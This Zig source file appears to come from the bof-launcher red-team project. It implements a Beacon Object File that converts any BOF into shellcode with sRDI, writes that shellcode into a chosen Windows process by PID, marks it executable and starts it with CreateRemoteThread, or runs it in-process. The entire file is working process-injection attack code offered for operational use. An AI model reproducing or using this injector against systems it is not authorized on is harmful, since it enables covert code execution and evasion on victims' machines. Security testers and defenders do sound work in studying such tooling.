///name: wProcessInjectionSrdi
///description: "Injects any BOF to any process"
///author: Z-Labs
///tags: ['windows','srdi','z-labs','process','injection']
///OS: windows
///sources:
///    - 'https://raw.githubusercontent.com/The-Z-Labs/bof-launcher/main/bofs/src/wProcessInjectionSrdi.zig'
///examples: '
/// wProcessInjectionSrdi i:<bof_len_in_bytes> z:<pointer_to_bof_bytes> i:<pid>
///'
///arguments:
///  - name: bof_data_len
///    desc: "Length in bytes of BOF to be injected"
///    type: integer
///    required: true
///  - name: bof_data_ptr
///    desc: "Pointer to the bytes of the BOF to be injected"
///    type: string
///    required: true
///  - name: pid
///    desc: "PID"
///    type: integer
///    required: true
///  - name: dump_shellcode
///    desc: "When --dump-shellcode string is present final shellcode will be written to 'shellcode.bin' file."
///    type: string
///    required: false
///errors:
///- name: UnknownError
///  code: 0xff
///  message: "Unknown error"
const std = @import("std");
const beacon = @import("bof_api").beacon;
const w32 = @import("bof_api").win32;
const srdi = @import("bof_api").srdi;
const bof_launcher = @import("bof_launcher_api");

comptime {
    @import("bof_api").embedFunctionCode("memcpy");
    @import("bof_api").embedFunctionCode("memset");
    @import("bof_api").embedFunctionCode("memmove");
    @import("bof_api").embedFunctionCode("__stackprobe__");
}
pub const panic = std.debug.no_panic;

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    const bof_bytes = blk: {
        const bof_len = beacon.dataInt(&parser);

        // BOF address must be passed like this:
        // try bof_args.add(std.mem.asBytes(&bof_ptr));
        const bof_ptr: *const [@sizeOf(usize)]u8 = @ptrCast(beacon.dataExtract(&parser, null));

        break :blk @as([*]const u8, @ptrFromInt(std.mem.readInt(usize, bof_ptr, .little)))[0..@intCast(bof_len)];
    };

    const pid = beacon.dataInt(&parser);

    const dump_shellcode = blk: {
        if (beacon.dataLength(&parser) != 0) {
            if (beacon.dataExtract(&parser, null)) |ptr| {
                if (std.mem.eql(u8, std.mem.span(ptr), "--dump-shellcode")) break :blk true;
            }
        }
        break :blk false;
    };

    const shellcode_bytes = srdi.allocateShellcode(@embedFile("bof_launcher_lib_embed"), bof_bytes, 0) catch return 0xff;
    defer srdi.freeShellcode(shellcode_bytes);

    if (dump_shellcode) {
        const file = std.fs.cwd().createFile("shellcode.bin", .{}) catch return 0xff;
        defer file.close();
        var writer = file.writer(&.{});
        writer.interface.writeAll(shellcode_bytes) catch return 0xff;
        writer.interface.flush() catch return 0xff;
    }

    // PID 0 is Windows idle process
    if (pid == 0) {
        return 0;
    }

    // PID -1 is current process
    if (pid == -1) {
        var old_protection: w32.DWORD = 0;
        if (w32.VirtualProtect(
            @constCast(shellcode_bytes.ptr),
            4096,
            w32.PAGE_EXECUTE_READ,
            &old_protection,
        ) == w32.FALSE) return 0xff;
        if (w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096) == w32.FALSE) return 0xff;

        @as(*const fn () callconv(.c) void, @ptrCast(shellcode_bytes.ptr))();

        // In Debug mode we restore memory protection to RW because Zig's memory allocator
        // does something like this: @memset(mem, undefined) when freeing it.
        if (@import("builtin").mode == .Debug) {
            if (w32.VirtualProtect(
                @constCast(shellcode_bytes.ptr),
                4096,
                w32.PAGE_READWRITE,
                &old_protection,
            ) == w32.FALSE) return 0xff;

            if (w32.FlushInstructionCache(w32.GetCurrentProcess(), shellcode_bytes.ptr, 4096) == w32.FALSE) return 0xff;
        }

        return 0;
    }

    const process = w32.OpenProcess(
        w32.PROCESS_VM_WRITE | w32.PROCESS_CREATE_THREAD | w32.PROCESS_VM_OPERATION,
        w32.FALSE,
        @bitCast(pid),
    ) orelse return 0xff;
    defer _ = w32.CloseHandle(process);

    const addr = w32.VirtualAllocEx(
        process,
        null,
        shellcode_bytes.len,
        w32.MEM_COMMIT | w32.MEM_RESERVE,
        w32.PAGE_READWRITE,
    ) orelse return 0xff;
    defer _ = w32.VirtualFreeEx(process, addr, shellcode_bytes.len, w32.MEM_RELEASE);

    {
        var num_bytes: w32.SIZE_T = undefined;
        if (w32.WriteProcessMemory(
            process,
            addr,
            shellcode_bytes.ptr,
            shellcode_bytes.len,
            &num_bytes,
        ) == w32.FALSE) return 0xff;
        if (num_bytes != shellcode_bytes.len) return 0xff;
    }
    {
        var old_protection: w32.DWORD = undefined;
        if (w32.VirtualProtectEx(
            process,
            addr,
            4096,
            w32.PAGE_EXECUTE_READ,
            &old_protection,
        ) == w32.FALSE) return 0xff;

        if (w32.FlushInstructionCache(process, addr, 4096) == w32.FALSE) return 0xff;
    }

    const thread_handle = w32.CreateRemoteThread(process, null, 0, @ptrCast(addr), null, 0, null) orelse return 0xff;
    defer _ = w32.CloseHandle(thread_handle);

    _ = beacon.printf(.output, "BOF runs in PID: %d, TID: %d\n", w32.GetProcessId(process), w32.GetThreadId(thread_handle));

    return 0;
}
